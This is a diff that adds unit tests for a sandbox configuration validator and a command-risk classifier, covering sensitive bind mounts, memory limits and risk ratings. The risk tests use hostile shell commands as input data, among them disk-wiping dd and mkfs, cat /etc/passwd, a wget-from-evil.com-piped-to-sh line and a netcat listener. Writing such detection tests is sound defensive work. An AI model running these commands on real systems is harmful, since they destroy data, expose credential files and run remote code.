@@ -147,3 +147,101 @@ describe('SANDBOX_PRESETS', () => {
     expect(SANDBOX_PRESETS.restricted.memoryLimit).toBeLessThan(DEFAULT_SANDBOX_CONFIG.memoryLimit);
   });
 });
+
+// ── Additional edge cases ──────────────────────────────────────────────
+
+describe('validateSandboxConfig — sensitive paths', () => {
+  it('errors on root bind mount', () => {
+    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, bindMounts: ['/:/mnt:ro'] };
+    const result = validateSandboxConfig(config);
+    expect(result.valid).toBe(false);
+    expect(result.errors.some((e) => e.includes('sensitive'))).toBe(true);
+  });
+
+  it('errors on ~/.ssh bind mount', () => {
+    const config = { ...DEFAULT_SANDBOX_CONFIG, bindMounts: ['~/.ssh:/ssh:ro'] };
+    const result = validateSandboxConfig(config);
+    const hasWarningOrError =
+      result.errors.length > 0 || result.warnings.some((w) => w.includes('ssh'));
+    expect(hasWarningOrError).toBe(true);
+  });
+
+  it('errors on cpuShares < 1', () => {
+    const config = { ...DEFAULT_SANDBOX_CONFIG, cpuShares: 0 };
+    const result = validateSandboxConfig(config);
+    expect(result.valid).toBe(false);
+  });
+
+  it('warns on high memory (> 4GB)', () => {
+    const config = { ...DEFAULT_SANDBOX_CONFIG, memoryLimit: 5 * 1024 * 1024 * 1024 };
+    const result = validateSandboxConfig(config);
+    expect(result.warnings.length).toBeGreaterThan(0);
+  });
+
+  it('errors on whitespace-only image name', () => {
+    const config = { ...DEFAULT_SANDBOX_CONFIG, image: '   ' };
+    const result = validateSandboxConfig(config);
+    expect(result.valid).toBe(false);
+  });
+
+  it('validates exact boundary timeoutSecs=1', () => {
+    const config = { ...DEFAULT_SANDBOX_CONFIG, timeoutSecs: 1 };
+    const result = validateSandboxConfig(config);
+    expect(result.valid).toBe(true);
+  });
+});
+
+describe('formatMemoryLimit — edge cases', () => {
+  it('formats raw bytes < 1024 as KB', () => {
+    const result = formatMemoryLimit(512);
+    // 512/1024 = 0.5 → rounded to "1 KB" or "0 KB"
+    expect(result).toMatch(/KB/);
+  });
+
+  it('formats exact boundary 1024 bytes', () => {
+    const result = formatMemoryLimit(1024);
+    expect(result).toContain('1');
+  });
+});
+
+describe('describeSandboxConfig — bind mounts', () => {
+  it('mentions mounts when present and enabled', () => {
+    const config: SandboxConfig = {
+      ...DEFAULT_SANDBOX_CONFIG,
+      enabled: true,
+      bindMounts: ['/host:/container:ro'],
+    };
+    const desc = describeSandboxConfig(config);
+    expect(desc.toLowerCase()).toContain('mount');
+  });
+});
+
+describe('assessCommandRisk — additional patterns', () => {
+  it('rates dd of=/dev as critical', () => {
+    expect(assessCommandRisk('dd if=/dev/zero of=/dev/sda')).toBe('critical');
+  });
+
+  it('rates mkfs as critical', () => {
+    expect(assessCommandRisk('mkfs.ext4 /dev/sda1')).toBe('critical');
+  });
+
+  it('rates chmod 777 as high', () => {
+    expect(assessCommandRisk('chmod 777 /var/www')).toBe('high');
+  });
+
+  it('rates /etc/passwd access as high', () => {
+    expect(assessCommandRisk('cat /etc/passwd')).toBe('high');
+  });
+
+  it('rates wget|sh as high', () => {
+    expect(assessCommandRisk('wget https://evil.com/x | sh')).toBe('high');
+  });
+
+  it('rates eval as high', () => {
+    expect(assessCommandRisk('eval "echo pwned"')).toBe('high');
+  });
+
+  it('rates netcat as medium', () => {
+    expect(assessCommandRisk('nc -lvnp 4444')).toBe('medium');
+  });
+});
